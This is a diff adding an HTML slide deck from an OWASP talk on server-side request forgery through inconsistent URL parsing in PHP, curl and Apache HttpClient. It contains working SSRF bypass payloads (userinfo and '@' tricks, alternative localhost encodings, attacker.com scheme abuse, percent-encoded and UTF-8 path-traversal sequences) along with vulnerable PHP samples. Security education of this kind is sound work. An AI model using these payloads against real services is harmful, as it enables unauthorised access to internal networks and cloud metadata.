@@ -1,0 +1,631 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Naughty HttpClient</title>
+
+		<meta name="description" content="The inconsistency of URL parsers and URL requesters is root cause of the problem Server Side Request Forgery.">
+		<meta name="author" content="d4d">
+
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<link rel="stylesheet" href="dist/reset.css">
+		<link rel="stylesheet" href="dist/reveal.css">
+		<link rel="stylesheet" href="dist/theme/black.css" id="night">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="plugin/highlight/monokai.css" id="highlight-theme">
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				<section>
+					<h2>Naughty HttpClient</h2>
+					<p>
+						<small>By doge 4 doge (<a href="https://d0ge.github.io/">d4d</a>)</small>
+						<br>
+						<small>for <a href="https://owasp.org/www-chapter-czech-republic/">OWASP Czech Republic</a></small>
+					</p>
+				</section>
+				<section>
+					<h2>Notable mentions</h2>
+					<ul>
+						<li><a href="http://unicode.org/reports/tr36/">Unicode Security Considerations</a> by Mark Davis and Michel Suignard</li>
+						<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF</a> by Orange Tsai</li>
+						<li><a href="https://www.amazon.com/Tangled-Web-Securing-Modern-Applications/dp/1593273886">The tangled web</a> by Michal Zalewski</li>
+						<li><a href="https://github.com/GrrrDog/weird_proxies">Weird Proxies</a> by Aleksei Tiurin</li>
+					</ul>
+				</section>
+				<section data-background-image="images/unnamed.png" data-background-repeat="no-repeat" data-background-position="top">
+					<h2>table of contents</h2>
+					<p>
+						<ul>
+							<li>Basics</li>
+							<li>Too long to parse</li>
+							<li>Null</li>
+							<li>UTF-8 fun</li>
+							<li>Lesson learned</li>
+						</ul>
+					</p>
+				</section>
+				<section data-transition="fade" data-background="#333333" data-background-transition="fade">
+					<h1>It's all about URL</h1>
+				</section>
+				<section data-auto-animate>
+					<p><span style="font-style:italic;font-weight:lighter">Uniform Resource Locator (URL)</span></p>
+					<table style="border: 1px solid white; font-size: 0.6em;">
+						<tr>
+							<th>scheme</th>
+							<th>:</th>
+							<th>//</th>
+							<th>userinfo</th>
+							<th>@</th>
+							<th>host</th>
+							<th>:</th>
+							<th>port</th>
+							<th>/path/</th>
+							<th>?</th>
+							<th>query</th>
+							<th>#</th>
+							<th>fragment</th>
+						</tr>
+					</table>
+				</section>
+				<section data-auto-animate>
+					<table style="border: 1px solid white; font-size: 0.6em;">
+						<tr>
+							<th>scheme</th>
+							<th>:</th>
+							<th>//</th>
+							<th>userinfo</th>
+							<th>@</th>
+							<th>host</th>
+							<th>:</th>
+							<th>port</th>
+							<th>/path/</th>
+							<th>?</th>
+							<th>query</th>
+							<th>#</th>
+							<th>fragment</th>
+						</tr>
+					</table>
+					<br>
+					<ul style="font-size: 0.6em;">
+						<li>A non-empty <span style="color:yellow">scheme</span> component followed by a colon ( <span style="color:yellow">:</span> )</li>
+						<li>An optional <span style="color:yellow">authority</span> component preceded by two slashes ( <span style="color:yellow">//</span> )</li>
+						<ul>
+							<li>An optional userinfo = user name + password </li>
+							<li>A host </li>
+							<li>An optional port </li>
+						</ul>
+						<li>A <span style="color:yellow">path</span> component, consisting of a sequence of path segments separated by a slash ( <span style="color:yellow">/</span> )</li>
+						<li>An optional query component preceded by a question mark (<span style="color:yellow">?</span>)</li>
+						<li>An optional fragment component preceded by a hash (<span style="color:yellow">#</span>)</li>
+					</ul>
+				</section>
+				<section>
+					<h2>Scheme</h2>
+					<p>
+						<span style="color:yellow">scheme</span>://username:password@host/path/?query#fragment
+					</p>
+				</section>
+				<section>
+					<p>
+						If <span style="color:yellow">//</span> is missed? 
+					</p>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						GET /red.php?h=1 HTTP/1.1
+						Host: 00d4d.com
+						User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
+						Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+						Accept-Language: en-US,en;q=0.5
+						Accept-Encoding: gzip, deflate
+						Upgrade-Insecure-Requests: 1
+												
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						HTTP/1.1 302 Found
+						Server: nginx
+						Date: Sun, 29 Nov 2020 18:47:18 GMT
+						Content-Type: text/html; charset=UTF-8
+						Location: http:00d4d.com/iframe.html
+						Content-Length: 31
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						HTTP/1.1 302 Found
+						Server: nginx
+						Date: Sun, 29 Nov 2020 18:47:18 GMT
+						Content-Type: text/html; charset=UTF-8
+						Location: https:00d4d.com/iframe.html
+						Content-Length: 31
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						HTTP/1.1 302 Found
+						Server: nginx
+						Date: Sun, 29 Nov 2020 18:47:18 GMT
+						Content-Type: text/html; charset=UTF-8
+						Location: ftp:00d4d.com/iframe.html
+						Content-Length: 31
+					</code></pre>
+				</section>
+				<section>
+					<p>
+						Chrome, Firefox, Safari will open page.
+					</p>
+				</section>
+				<section>
+					<h2>userinfo</h2>
+					<p>
+						scheme://<span style="color:yellow">username:password</span>@host/path/?query#fragment
+					</p>
+				</section>
+				<section>
+					<pre><code data-trim>
+						http://127.0.0.1@127.2.2.2/
+						http://127.0.0.1#@127.2.2.2/
+						http://127.0.0.1&@127.2.2.2/
+						http://127.0.0.1?@127.2.2.2/
+						http://127.0.0.1 #@127.2.2.2/
+						http://127.0.0.1 &@127.2.2.2/
+						http://127.0.0.1 &@127.2.2.2# @127.3.3.3/
+					</code></pre>
+				</section>
+				<section>
+					<h2>host</h2>
+					<p>
+						scheme://username:password@<span style="color:yellow">host</span>/path/?query#fragment
+					</p>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						| localhost | decimal IP   | IPv6 / IPv4   |
+						| --------- | ------------ | ------------- |
+						| 127.1     | 017700000001 | [::127.0.0.1] |  
+						| 127.0.1   | 2130706433   | [::127.0.0.1%1] | 
+						| 127.0.0.1 | 0x7f.1       | [0:0:0:0:0:ffff:127.0.0.1] | 
+						| 127.0.0.2 | 0177.0.0.2   | [0:0:0:0:0:ffff:127.0.0.2%1] | 
+					</textarea>
+				</section>
+				<section>
+					<pre><code data-trim>
+						0.0.0.0
+						\g\o\o\g\l\e.\c\o\m
+						\103oogle.\099om
+						127。0。0。1
+						ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
+					</code></pre>
+				</section>
+				<section>
+					<h2>path</h2>
+					<p>
+						scheme://username:password@host<span style="color:yellow">/path/?query#fragment</span>
+					</p>
+				</section>
+				<section>
+					<p>
+						<ul>
+							<li>Find Open Redirect at whitelisted host that redirects requests to the SSRF the target URL</li>
+							<li>Launch the SSRF pointing to vulnerable page</li>
+							<li>Redirect to local network</li>
+						</ul>
+					</p>
+				</section>
+				<section data-transition="fade" data-background="#333333" data-background-transition="fade">
+					<h1>Too long to parse</h1>
+				</section>
+				<section data-auto-animate>
+					<h2>Example</h2>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						$host = parse_url($_GET["url"]);
+						preg_match(
+								'/^api.vulnerable.com$/', 
+								$host['host'], 
+								$matches, 
+								PREG_OFFSET_CAPTURE);
+						if($matches){
+							$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, $_GET["url"]);
+							$request = array(
+								'response' => curl_exec($ch),
+								'info' => curl_getinfo($ch),
+								'error_number' => curl_errno($ch),
+								'error_message' => curl_error($ch));
+						}
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<h2>Example</h2>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						$host = parse_url($_GET["url"]);
+						preg_match(
+								'/^api\.vulnerable\.com$/', 
+								$host['host'], 
+								$matches, 
+								PREG_OFFSET_CAPTURE);
+						if($matches){
+							$ch = curl_init();
+							curl_setopt($ch, CURLOPT_URL, $_GET["url"]);
+							$request = array(
+								'response' => curl_exec($ch),
+								'info' => curl_getinfo($ch),
+								'error_number' => curl_errno($ch),
+								'error_message' => curl_error($ch));
+						}
+					</code></pre>
+				</section>
+				<section>
+					<h2>Abusing URL Parsers</h2>
+						<ul>
+							<li>http://foo@<span style="color:yellow">attacker.com:80</span>@api.vulnerable.com</li>
+							<li>http://foo@<span style="color:yellow">127.0.0.1</span>%20@api.vulnerable.com/</li>
+						</ul>
+				</section>
+				<section>
+					<h2><a href="https://github.com/d0ge/getaddr.git">getaddr</a></h2>
+					<p>
+						tiny Go tool to bruteforce Unix DNS resolver. Pay attention that behavior netdns=go/cgo may diff. Force low level resolver with build tag netcgo
+					</p>
+				</section>
+				<section>
+					<h2>getaddr</h2>
+					<pre><code data-trim>
+						func look(wg *sync.WaitGroup, names []string, nums chan []Result) {
+							defer wg.Done()
+							var results = make([]Result, 0)
+							for _, name := range names {
+								ips, _ := net.LookupIP(name)
+								if ips != nil {
+									r := Result{name: name, IPs: ips}
+									results = append(results, r)
+								}
+							}
+							nums <- results
+						}
+					</code>
+					</pre>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						Ubuntu 16.04
+						```bash
+						"127.0.0.1\x00127.0.0.2"	  [127.0.0.1]
+						"127.0.0.1\t127.0.0.2"		[127.0.0.1]
+						"127.0.0.1\n127.0.0.2"		[127.0.0.1]
+						"127.0.0.1\v127.0.0.2"		[127.0.0.1]
+						"127.0.0.1\f127.0.0.2"		[127.0.0.1]
+						"127.0.0.1\r127.0.0.2"		[127.0.0.1]
+						"127.0.0.1 127.0.0.2"		 [127.0.0.1]
+						``` 
+						Ubuntu latest
+						```bash
+						"127.0.0.1\x00127.0.0.2"		[127.0.0.1]
+						"::127.0.0.1%127.0.0.2"		 [::7f00:1]
+						```
+					</textarea>
+				</section>
+				<section>
+					<h2><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">PHP SSRF Techniques</a></h2>
+						<ul>
+							<li><span style="color:red">0</span>://<span style="color:yellow">evil.com:80</span>;google.com:80/</a></li>
+							<li><span style="color:red">0</span>://<span style="color:yellow">evil.com:80</span>,google.com:80/</a></li>
+						</ul>
+				</section>
+				<section>
+					<h2>Abusing length limit</h2>
+					<p>"although non-registered schemes are used in practice"</p>
+				</section>
+				<section>
+					<h2>curl</h2>
+					<div style="position: absolute; width: 100%; right: 0; box-shadow: 0 10px 40px rgba(0,0,0,0.5), 0 5px 25px rgba(0,0,0,0.2); background-color: rgba(0, 0, 0, 0.9); color: #fff; padding: 10px; text-align: left;">
+						<p>
+							<span style="color: #b8f;">d4d</span> in <span style="color: #4f5;">~</span> <span style="color: #e83;">λ</span>
+							<span style="display: inline-block;"><span style="color: #4f5;">curl</span> <span style="color: #ea6;">attacker.com</span><span>://anything</span></span>
+							<br>
+							<span style="display: inline-block;" class="fragment fade-up">
+									<span>curl: (1) Protocol "attacker.com" not supported or disabled in libcurl</span><br>
+							</span>
+						</p>
+					</div>
+				</section>
+				<section>
+					<h2>curl</h2>
+					<div style="position: absolute; width: 100%; right: 0; box-shadow: 0 10px 40px rgba(0,0,0,0.5), 0 5px 25px rgba(0,0,0,0.2); background-color: rgba(0, 0, 0, 0.9); color: #fff; padding: 10px; text-align: left;">
+						<p>
+							<span style="color: #b8f;">d4d</span> in <span style="color: #4f5;">~</span> <span style="color: #e83;">λ</span>
+							<span style="display: inline-block;"><span style="color: #4f5;">curl</span> <span style="color: #ea6;">longsubdomain.attacker.com</span><span>://anything</span></span>
+							<br>
+							<span style="display: inline-block;" class="fragment fade-up">
+									<span>curl: (6) Could not resolve host: longsubdomain.attacker.com</span><br>
+							</span>
+						</p>
+					</div>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						GET /owasp.php?url=longsubdomain.attacker.com://
+							api.vulnerable.com/ HTTP/1.1
+						Host: 00d4d.com
+						User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
+						Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+						Accept-Language: en-US,en;q=0.5
+						Accept-Encoding: gzip, deflate
+						Upgrade-Insecure-Requests: 1
+												
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						HTTP/1.1 200 OK
+						Server: nginx
+						Date: Sun, 29 Nov 2020 18:47:18 GMT
+						Content-Type: text/html; charset=UTF-8
+						Content-Length: 1459
+
+						Array(
+							[scheme] => longsubdomain.attacker.com
+							[host] => api.vulnerable.com
+							[path] => /)
+						[url] => 
+						http://longsubdomain.attacker.com://api.vulnerable.com/
+						[error_message] => 
+						Could not resolve host: longsubdomain.attacker.com
+					</code></pre>
+				</section>
+				<section>
+					<p>Patch 🤔</p>
+					<p>Latest versions of curl are not vulnerable to this attack<br>CVE-2017-9502 - URL file scheme drive letter buffer overflow</p>
+				</section>
+				<section data-transition="fade" data-background="#333333" data-background-transition="fade">
+					<h1>Null</h1>
+				</section>
+				<section>
+					<h2>URI</h2>
+					<p>
+						<ul>
+							<li><b>Uniform Resource Identifier (URI)</b> − a sequence of characters that allows the complete identification of any abstract or physical resource</li>
+							<li><b>Uniform Resource Locator (URL)</b> − a subset of URI that, in addition to identifying where a resource is available, describes the primary mechanism to access it</li>
+						</ul>
+					</p>
+				</section>
+				<section>
+					<a href="https://hc.apache.org/">The Apache HttpComponents</a>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						String payload ="http://133.37.13.37:80/";
+						URL payloadURL = new URL(payload);
+						URI payloadURI = new URI(payload);
+						HttpHost target = URIUtils.extractHost(payloadURI);
+						if (target!=null) {
+							return target.getHostName();
+						}
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						String payload ="http://133.37.13.37:80/";
+						URL payloadURL = new URL(payload); // 133.37.13.37
+						URI payloadURI = new URI(payload); // 133.37.13.37
+						HttpHost target = URIUtils.extractHost(payloadURI);
+						if (target!=null) {
+							return target.getHostName();
+						}
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						String payload ="http://%20:80/";
+						URL payloadURL = new URL(payload); // %20
+						URI payloadURI = new URI(payload); // null
+						HttpHost target = URIUtils.extractHost(payloadURI);
+						if (target!=null) {
+							return target.getHostName();
+						}
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						if (host == null) { // normal parse failed; 
+						// let's do it ourselves
+						// authority does not seem to care about  
+						// the valid character-set for host names
+						host = uri.getAuthority();
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						host = uri.getAuthority();
+						if (host != null) {
+							// Strip off any leading user credentials
+							final int at = host.indexOf('@');
+							if (at >= 0) {
+								if (host.length() > at+1 ) {
+									host = host.substring(at+1);
+								} else {
+									host = null; // @ on its own
+								}
+							}
+							...
+							final int colon = host.indexOf(':');
+					</code></pre>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						```bash
+						~# ping 127.1
+						PING 127.1 (127.0.0.1) 56(84) bytes of data.
+						~# ping 127.0.1
+						PING 127.0.1 (127.0.0.1) 56(84) bytes of data.
+						~# ping 127.0.0.1
+						PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+						``` 
+					</textarea>
+				</section>
+				<section data-auto-animate>
+					<p>http://<span style="color:red">%40</span><span style="color:yellow">127.0.0.1</span><span style="color:red">%3a</span>443@133.37.13:80/</p>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						String payload ="http://%40127.0.0.1%3a443@133.37.13:80/";
+						URL payloadURL = new URL(payload);
+						URI payloadURI = new URI(payload);
+						HttpHost target = URIUtils.extractHost(payloadURI);
+						if (target!=null) {
+							return target.getHostName();
+						}
+					</code></pre>
+				</section>
+				<section data-auto-animate>
+					<p>http://<span style="color:red">%40</span><span style="color:yellow">127.0.0.1</span><span style="color:red">%3a</span>443@133.37.13:80/</p>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+						String payload ="http://%40127.0.0.1%3a443@133.37.13:80/";
+						URL payloadURL = new URL(payload); // 133.37.13
+						URI payloadURI = new URI(payload); // null
+						HttpHost target = URIUtils.extractHost(payloadURI);
+						if (target!=null) {
+							return target.getHostName(); // 127.0.0.1
+						}
+					</code></pre>
+				</section>
+				<section>
+					<p>Won't Fix</p>
+					<p><span style="font-style:italic;font-weight:lighter">
+						"Apache HttpClient
+						can be used to generate any arbitrary valid (or even invalid) HTTP
+						messages with any arbitrary request URI (valid or invalid) and send
+						them to the origin server for execution."
+						</span>
+					</p>
+				</section>
+				<section data-transition="fade" data-background="#333333" data-background-transition="fade">
+					<h1>UTF-8 fun</h1>
+				</section>
+				<section>
+					<p>
+						<span style="font-style:italic;font-weight:lighter">
+							"For example, the backslash character <span style="color:yellow">\</span> can often be a dangerous character to let through a gatekeeper,
+							because it can be used to access different directories.
+							The backslash is represented in UTF-8 as the byte sequence &lt;5C&gt;
+							However, as a non-shortest form, backslash could also be represented as the byte sequence &lt;C1 9C&gt;"
+						</span>
+					</p>
+				</section>
+				<section>
+					<p>
+						<span style="font-style:italic;font-weight:lighter">
+							"Again, incoming characters must never be deleted, because that can cause security problems."
+						</span>
+					</p>
+				</section>
+				<section data-background-image="images/apache.jpg" data-background-repeat="no-repeat">
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						| Ю | Я | п |
+						| - | - | - |
+						| %D0%AE | %D0%AE | %D0%BF |
+						| 042E | 042F | 043F |
+					</textarea>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						| Ю | Я | п |
+						| - | - | - |
+						| %D0%AE | %D0%AE | %D0%BF |
+						| ~04~2E | ~04~2F | ~04~3F |
+						| . | / | ? |
+					</textarea>
+				</section>
+				<section>
+					<h2>rewriteURI</h2>
+					<p>
+						"Apache-HttpClient/4.5.8" <br> "Apache-HttpClient/4.5.9"
+					</p>
+				</section>
+				<section data-auto-animate>
+					<pre data-id="code-animation"><code data-trim data-line-numbers>
+					/a/b/%D0%AE%D0%AE%D0%AF%D0%AE%D0%AE%D0%AF%D0%BF1/items?q=1
+					/a/b/..%2F..%2F%3F1/items?q=1
+					</code></pre>
+				</section>
+				<section>
+					<h2><a href="https://github.com/GrrrDog/weird_proxies">Weird Proxies</a></h2>
+					<p>
+						Many web servers support path normalization:
+						<pre>
+							<code>
+/long/../path/here -> /path/here
+/long/./path/here -> /long/path/here
+							</code>
+						</pre>
+					</p>
+				</section>
+				<section>
+					<h2>Open Redirect</h2>
+					<p>
+						API?
+					</p>
+				</section>
+				<section>
+					<h2>Lesson learned</h2>
+					<ul>
+						<li>Patch management not works</li>
+						<li>Disable metadata API</li>
+						<li>Firewall/Network ACL</li>
+					</ul>
+				</section>
+				<section>
+					<h2>More</h2>
+					<p>
+						<a href="https://d0ge.github.io/">https://d0ge.github.io/</a> <br>
+						<a href="https://github.com/d0ge/getaddr.git">https://github.com/d0ge/getaddr.git</a>
+					</p>
+					<img src="images/qr_blog.svg"/>
+				</section>
+				<section data-background-image="images/time-for-story-over.jpeg" data-background-repeat="no-repeat">
+					<h2>Q&A</h2>
+				</section>
+
+			</div>
+
+		</div>
+
+		<script src="dist/reveal.js"></script>
+		<script src="plugin/zoom/zoom.js"></script>
+		<script src="plugin/notes/notes.js"></script>
+		<script src="plugin/search/search.js"></script>
+		<script src="plugin/markdown/markdown.js"></script>
+		<script src="plugin/highlight/highlight.js"></script>
+		<script>
+
+			// Also available as an ES module, see:
+			// https://revealjs.com/initialization/
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				center: true,
+				hash: true,
+
+				// Learn about plugins: https://revealjs.com/plugins/
+				plugins: [ RevealZoom, RevealNotes, RevealSearch, RevealMarkdown, RevealHighlight ]
+			});
+
+		</script>
+
+	</body>
+</html>
